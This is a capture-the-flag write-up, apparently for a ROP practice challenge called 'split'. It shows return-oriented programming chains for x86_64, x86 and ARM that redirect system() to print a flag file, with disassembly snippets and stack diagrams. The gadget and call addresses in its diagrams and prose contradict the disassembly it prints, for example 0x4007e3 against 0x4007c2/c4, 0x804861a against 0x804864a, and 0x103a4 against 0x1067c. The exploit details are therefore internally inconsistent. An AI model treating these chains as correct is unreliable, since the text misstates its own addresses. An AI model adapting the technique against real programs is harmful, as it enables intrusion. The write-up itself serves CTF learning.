# split

Now the fun starts, i'll focus on what are the pieces i use to build ROP chains and
what is the purpose of each of those. For this challenge, like the last one, listing
symbols tells us a lot.
```bash
$ nm split
...
0000000000601060 t usefulString  # x86_64
...
0804a030 t usefulString          # x86
...
0002103c t usefulString          # ARMv5
...
```
By checking with a debugger, we can check the content of it, which is `/bin/cat flag.txt`   

On each binary, the usefulFunction is calling system, with `/bin/ls` as argument.
The goal is to replace this argument with our usefulString.

## x86_64:
```asm
000000000040074b <ret2win + 0x09>:
  40074b:	e8 10 fe ff ff   call   400560 <system@plt>

00000000004007c2 <__libc_csu_init + 0x62>:
  4007c2:	41 5f            pop    r15
  4007c4:	c3               ret    
```
The 0x5f opcode is the one for `pop rdi`, the 0x41 byte is used to extend it
to the second set of registers thus displaying a `pop r15`. We can use 0x4007e3 as a
`pop rdi` gadget.   
With all of this, we can craft our exploit and call `system("/bin/cat flag.txt")`.   
```
┌─────────────────────────┐  ┌─────────────────────────┐
│ buffer                  │  │ 20 20 20 20 20 20 20 20 │ <- padding (40 bytes)
│                         │  │ 20 20 20 20 20 20 20 20 │
│                         │  │ 20 20 20 20 20 20 20 20 │
├─────────────────────────┤  │ 20 20 20 20 20 20 20 20 │
│ old_rbp                 │  │ 20 20 20 20 20 20 20 20 │
├─────────────────────────┤  ├─────────────────────────┤
│ ret                     │  │ 0x4007c3                │ <- pop rdi; ret
├─────────────────────────┤  ├─────────────────────────┤
│ ...                     │  │ 0x601060                │ <- usefulString address
└─────────────────────────┘  ├─────────────────────────┤
                             │ 0x40074b                │ <- system call
                             └─────────────────────────┘
```
## x86:
```asm
0804864a <ret2win + 0x1e>:
 804864a:	e8 91 fd ff ff   call   80483e0 <system@plt>
```
When working with x86 binaries, arguments are passed to functions through the stack.   
This said, we just need to have the usefulString on top of the stack, then jump to the system call.
```
┌─────────────┐  ┌─────────────┐
│ buffer      │  │ 20 20 20 20 │ <- padding (44 bytes)
│             │  │ 20 20 20 20 │
│             │  │ 20 20 20 20 │
│             │  │ 20 20 20 20 │
│             │  │ 20 20 20 20 │
│             │  │ 20 20 20 20 │
│             │  │ 20 20 20 20 │
│             │  │ 20 20 20 20 │
│             │  │ 20 20 20 20 │
├─────────────┤  │ 20 20 20 20 │
│ old ebp     │  │ 20 20 20 20 │
├─────────────┤  ├─────────────┤
│ ret         │  │ 0x804861a   │ <- system call
├─────────────┤  ├─────────────┤
│ ...         │  │ 0x804a030   │ <- usefulString address
└─────────────┘  └─────────────┘
```
## ARM:
```asm
00010678 <_fini + 0x04>:
   1067c:	e8bd8008 	pop	{r3, pc}

00010558 <main + 0x40>:
   10558:	e1a00003 	mov	r0, r3
   1055c:	e8bd8800 	pop	{fp, pc}

00010600 <ret2win + 0x14>:
   10600:	ebffff79 	bl	103ec <system@plt>
```
Using two gadgets, we can pop our usefulString address into r3, then move it into r0.
The rest is the same, jumping to the system call.
```
┌─────────────┐┌─────────────┐
│ buffer      ││ 20 20 20 20 │ <- padding (36 bytes)
│             ││ 20 20 20 20 │
│             ││ 20 20 20 20 │
│             ││ 20 20 20 20 │
│             ││ 20 20 20 20 │
│             ││ 20 20 20 20 │
│             ││ 20 20 20 20 │
├─────────────┤│ 20 20 20 20 │
│ old fp      ││ 20 20 20 20 │
├─────────────┤├─────────────┤
│ lr          ││ 0x103a4     │ <- pop {r3, pc}
├─────────────┤├─────────────┤
│ ...         ││ 0x2103c     │ <- usefulString address
└─────────────┘├─────────────┤
               │ 0x10558     │ <- mov r0, r3; pop {fp, pc}
               ├─────────────┤
               │ 0           │ <- dummy fp value
               ├─────────────┤
               │ 0x105e0     │ <- sytem call
               └─────────────┘
```
